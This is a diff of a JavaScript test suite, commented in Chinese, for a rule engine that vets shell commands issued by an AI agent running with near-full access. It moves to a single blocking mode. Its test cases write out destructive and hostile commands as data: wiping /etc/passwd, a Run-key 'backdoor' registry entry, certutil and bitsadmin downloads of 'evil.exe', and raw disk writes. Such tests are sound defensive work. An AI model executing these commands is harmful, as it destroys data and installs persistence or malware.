@@ -74,7 +74,7 @@ for (const cmd of SAFE) {
 	check(`safe: ${cmd.slice(0, 50)}`, r.impacts.length === 0 && !r.ambiguous, JSON.stringify(r));
 }
 
-console.log("  -- 危险命令（应命中对应规则 id）");
+console.log("  -- 危险命令（应命中对应规则 id；v1.2.0：安装类/可逆写/HKCU 已放行）");
 const DANGER = [
 	["bcdedit /enum {current}", "boot:bcdedit"],
 	["bootrec /fixmbr", "boot:bootrec"],
@@ -84,13 +84,9 @@ const DANGER = [
 	["net stop spooler", "sys:sc"],
 	["sc config spooler start= disabled", "sys:sc"],
 	["reg add HKLM\\Software\\Test /v x /t REG_SZ /d 1 /f", "sys:hklm"],
-	["winget install notepadplusplus", "sys:software"],
 	["pnputil /add-driver x.inf", "sys:pnputil"],
-	["pip install requests", "sys:packages"],
 	["Remove-Item C:\\Windows\\Temp\\a.txt", "write-outside"],
-	["Set-Content -Path $env:TEMP\\a.txt -Value x", "write-outside"],
-	["New-Item -Path 'C:\\Windows\\Temp\\a.txt'", "write-outside"],
-	["Set-ItemProperty HKCU:\\Software\\Test -Name x -Value 1", "write-outside"]
+	["New-Item -Path 'C:\\Windows\\Temp\\a.txt'", "write-outside"]
 ];
 for (const [cmd, expectId] of DANGER) {
 	const r = analyze(cmd);
@@ -125,12 +121,11 @@ for (const cmd of READS) {
 // ============ 2. A1 绕过用例（别名 / .NET / 拼接 / 调用运算符 / 反引号）============
 console.log("\n[2] A1 绕过用例（v1.0.2 修复）");
 
-console.log("  -- 别名写动词应判 write-outside");
+console.log("  -- 别名写动词应判 write-outside（删除/关键路径语义；可逆写放行）");
 const ALIAS_DANGER = [
 	["ri C:\\Windows\\System32\\drivers\\etc\\hosts", "ri=Remove-Item 别名"],
 	["sp HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\backdoor C:\\x.exe", "sp=Set-ItemProperty 别名"],
 	["ni C:\\Windows\\Temp\\x.txt", "ni=New-Item 别名"],
-	["ac $env:TEMP\\x.txt 'x'", "ac=Add-Content 别名"],
 	["mv C:\\Users\\other\\a.txt C:\\Windows\\a.txt", "mv=Move-Item 别名"],
 	["cp C:\\Users\\other\\a.txt C:\\Windows\\a.txt", "cp=Copy-Item 别名"],
 	["rm C:\\Windows\\Temp\\a.txt", "rm=Remove-Item 别名"]
@@ -138,6 +133,10 @@ const ALIAS_DANGER = [
 for (const [cmd, label] of ALIAS_DANGER) {
 	const r = analyze(cmd);
 	check(`${label}: ${cmd.slice(0, 48)}`, r.impacts.length > 0 && r.ruleIds.includes("write-outside"), JSON.stringify(r));
+}
+{
+	const r = analyze("ac $env:TEMP\\x.txt 'x'");
+	check("ac=Add-Content 别名 + 可逆写临时目录 → 放行", r.impacts.length === 0 && !r.ambiguous, JSON.stringify(r));
 }
 
 console.log("  -- 动态构造（调用运算符/写类 .NET/反引号）应判 ambiguous");
@@ -241,8 +240,8 @@ console.log("\n[6] cordis.patch.yml");
 const patch = readFileSync(join(root, "cordis.patch.yml"), "utf8");
 check("含 almost-full-access 档位", patch.includes("almost-full-access:"));
 check("档位名带 🛡️ Almost Full Access", patch.includes("🛡️ Almost Full Access"));
-check("Fast/Safe 是分支而非预设（不含 lenient:/strict: 档位键）", !patch.includes("lenient:") && !patch.includes("strict:"), "不应出现独立档位");
-check("描述提及 Fast/Safe 分支", patch.includes("Fast Mode") && patch.includes("Safe Mode"));
+check("无独立 Fast/Safe 档位（lenient:/strict: 键不存在）", !patch.includes("lenient:") && !patch.includes("strict:"), "不应出现独立档位");
+check("描述声明动态命令子代理审查", patch.includes("dynamic/indirect commands are reviewed by a subagent"));
 check("sandbox=danger-full-access", patch.includes("sandbox: danger-full-access"));
 check("含 permission 预设覆盖", patch.includes("- id: permission"));
 check("含插件挂载", patch.includes("name: dsh-almost-full-access"));
@@ -489,12 +488,11 @@ for (const cmd of SAFE_REGRESSION) {
 	check(`regression safe: ${cmd.slice(0, 40)}`, r.impacts.length === 0 && !r.ambiguous, JSON.stringify(r));
 }
 
-// ============ 11. Lenient / Strict 双模式差异（v1.1.0）============
-console.log("\n[11] Lenient / Strict 双模式差异（v1.1.0）");
-const LEN = (cmd) => analyzeCommand(cmd, WS, "", "lenient");
+// ============ 11. 单一模式：确定性拦截（v1.2.0）============
+console.log("\n[11] 单一模式：确定性拦截（v1.2.0）");
 
-console.log("  -- Lenient 也拦（不可逆损失 / 影响系统正确运行）");
-const LEN_BLOCK = [
+console.log("  -- 不可逆损失 / 影响系统正确运行 → 弹面板");
+const BLOCK = [
 	["Stop-Service -Name Spooler -Force", "sys:service"],
 	["rm -f /etc/passwd", "write-outside"],
 	["Remove-Item C:\\Users\\other\\a.txt", "write-outside"],
@@ -506,87 +504,65 @@ const LEN_BLOCK = [
 	["setx PATH \"C:\\x\" /M", "sys:env"],
 	["Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts x", "write-outside"],
 	["tar -xvf /tmp/x.tar -C /etc", "write-outside"],
-	["shutdown /r /t 0", "boot:shutdown"]
+	["shutdown /r /t 0", "boot:shutdown"],
+	["ri C:\\Users\\other\\a.txt", "write-outside"],
+	["shred -u /etc/passwd", "write-outside"],
+	["truncate -s 0 C:\\Users\\other\\data.bin", "write-outside"],
+	["curl -o C:\\Windows\\evil.exe http://x", "write-outside"],
+	["certutil -urlcache -split -f http://x/a.exe C:\\Windows\\a.exe", "write-outside"],
+	["npm uninstall -g x", "sys:uninstall"],
+	["sc config spooler start= disabled", "sys:sc"]
 ];
-for (const [cmd, expectId] of LEN_BLOCK) {
-	const r = LEN(cmd);
-	check(`lenient block: ${cmd.slice(0, 40)} -> ${expectId}`, r.impacts.length > 0 && r.ruleIds.includes(expectId), JSON.stringify(r));
+for (const [cmd, expectId] of BLOCK) {
+	const r = analyze(cmd);
+	check(`block: ${cmd.slice(0, 40)} -> ${expectId}`, r.impacts.length > 0 && r.ruleIds.includes(expectId), JSON.stringify(r));
 }
 
-console.log("  -- Lenient 放行（strict 对应拦截/送审）");
-const LEN_FREE = [
-	["winget install notepadplusplus", "sys:software"],
-	["pip install requests", "sys:packages"],
-	["Set-Content -Path C:\\Users\\other\\a.txt -Value x", "write-outside"],
-	["Set-ItemProperty HKCU:\\Software\\Test -Name x -Value 1", "reg:HKCU"],
-	["New-Item -Path 'C:\\Users\\other\\x.txt'", "write-outside"],
-	["sudo apt update", "sys:bash"],
-	["Expand-Archive -Path a.zip -DestinationPath 'C:\\Users\\other\\out'", "write-outside"]
+console.log("  -- 可逆/用户级/安装 → 直接放行（不弹面板）");
+const FREE = [
+	["winget install notepadplusplus", "安装软件"],
+	["pip install requests", "安装包"],
+	["Set-Content -Path C:\\Users\\other\\a.txt -Value x", "可逆写用户目录"],
+	["Set-ItemProperty HKCU:\\Software\\Test -Name x -Value 1", "HKCU 用户注册表"],
+	["New-Item -Path 'C:\\Users\\other\\x.txt'", "可逆写用户目录"],
+	["Expand-Archive -Path a.zip -DestinationPath 'C:\\Users\\other\\out'", "解压用户目录"],
+	["curl -o C:\\Users\\me\\evil.exe http://x", "可逆落地用户目录（LLM 快审）"],
+	["reg delete HKCU\\Software\\X /f", "HKCU 删除"]
 ];
-for (const [cmd, strictRule] of LEN_FREE) {
-	const r = LEN(cmd);
-	const strict = analyze(cmd);
-	check(`lenient free: ${cmd.slice(0, 38)}（strict=${strictRule}）`, r.impacts.length === 0 && !r.ambiguous, "lenient=" + JSON.stringify(r) + " strict=" + JSON.stringify(strict.ruleIds));
+for (const [cmd, label] of FREE) {
+	const r = analyze(cmd);
+	check(`free: ${label}`, r.impacts.length === 0, JSON.stringify(r));
 }
 
-console.log("  -- Lenient 动态命令直接放行（strict 送 LLM）");
-for (const cmd of ["iex 'Write-Output 1'", "curl -o C:\\Users\\other\\x.exe http://x", "& ('Remove'+'-Item') C:\\Users\\other\\file.txt"]) {
-	const r = LEN(cmd);
-	const strict = analyze(cmd);
-	check(`lenient dynamic: ${cmd.slice(0, 40)}`, r.impacts.length === 0 && !r.ambiguous && strict.ambiguous === true, "lenient=" + JSON.stringify(r));
-}
-
-// ============ 12. Fast 模式严防死守（v1.1.1 补漏）============
-console.log("\n[12] Fast 模式严防死守（v1.1.1）");
-
-console.log("  -- 删除类别名/覆写粉碎（不可逆）");
-const FAST_DELETE = [
-	["ri C:\\Users\\other\\a.txt", "ri=Remove-Item 别名删除"],
-	["shred -u /etc/passwd", "shred 覆写删除"],
-	["truncate -s 0 C:\\Users\\other\\data.bin", "truncate 清空"],
-	["deltree /y C:\\Users\\other\\x", "deltree"]
+console.log("  -- 动态/间接命令 → LLM 子代理快审（不弹面板，除非判 risky）");
+const DYNAMIC = [
+	"iex 'Write-Output 1'",
+	"curl -o C:\\Users\\other\\x.exe http://x",
+	"sudo apt update",
+	"Start-Process notepad",
+	"& $fn C:\\x",
+	"[IO.File]::WriteAllText('C:\\Users\\me\\x.txt','x')",
+	"cmd /c whoami"
 ];
-for (const [cmd, label] of FAST_DELETE) {
-	const r = LEN(cmd);
-	check(`fast delete: ${label}`, r.impacts.length > 0 && r.ruleIds.includes("write-outside"), JSON.stringify(r));
+for (const cmd of DYNAMIC) {
+	const r = analyze(cmd);
+	check(`dynamic: ${cmd.slice(0, 40)} → 送 LLM`, r.ambiguous === true && r.impacts.length === 0, JSON.stringify(r));
 }
 
-console.log("  -- 下载落地/解压到系统关键路径");
-const FAST_CRITICAL = [
-	["curl -o C:\\Windows\\evil.exe http://x", "curl -o 系统目录"],
+// ============ 12. 关键路径与删除类覆盖（v1.1.1 补漏，v1.2.0 保留）============
+console.log("\n[12] 关键路径与删除类覆盖");
+
+console.log("  -- 系统关键路径（含原始设备）");
+const CRITICAL = [
 	["curl -o 'C:\\Windows\\Temp\\x.dll' http://x", "curl -o 系统目录(引号)"],
-	["certutil -urlcache -split -f http://x/a.exe C:\\Windows\\a.exe", "certutil 落地系统目录"],
 	["bitsadmin /transfer job /download http://x/a.exe C:\\Windows\\a.exe", "bitsadmin 落地系统目录"],
 	["Replace-Item -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value x", "Replace-Item 系统文件"],
 	["tar -xvf x.tar -C C:\\Windows\\System32", "tar 解压系统目录"],
 	['[IO.File]::WriteAllBytes("\\\\.\\PhysicalDrive0", $data)', "原始设备直写"]
 ];
-for (const [cmd, label] of FAST_CRITICAL) {
-	const r = LEN(cmd);
-	check(`fast critical: ${label}`, r.impacts.length > 0 && r.ruleIds.includes("write-outside"), JSON.stringify(r));
-}
-
-console.log("  -- 同目标非系统路径仍放行（可逆写）");
-const FAST_FREE = [
-	["curl -o C:\\Users\\me\\evil.exe http://x", "可逆落地用户目录"],
-	["certutil -urlcache -split -f http://x/a.exe C:\\Users\\me\\a.exe", "certutil 落地用户目录"],
-	["Set-Content -Path C:\\Users\\other\\a.txt -Value x", "可逆写用户目录"]
-];
-for (const [cmd, label] of FAST_FREE) {
-	const r = LEN(cmd);
-	check(`fast free: ${label}`, r.impacts.length === 0 && !r.ambiguous, JSON.stringify(r));
-}
-
-console.log("  -- 卸载类补全 / 系统级命令");
-const FAST_SYS = [
-	["npm uninstall -g x", "sys:uninstall"],
-	["cargo remove x", "sys:uninstall"],
-	["sc config spooler start= disabled", "sys:sc"],
-	["reg delete HKLM\\Software\\X /f", "sys:hklm"]
-];
-for (const [cmd, expectId] of FAST_SYS) {
-	const r = LEN(cmd);
-	check(`fast sys: ${cmd.slice(0, 40)} -> ${expectId}`, r.impacts.length > 0 && r.ruleIds.includes(expectId), JSON.stringify(r));
+for (const [cmd, label] of CRITICAL) {
+	const r = analyze(cmd);
+	check(`critical: ${label}`, r.impacts.length > 0 && r.ruleIds.includes("write-outside"), JSON.stringify(r));
 }
 
 // ============ 汇总 ============
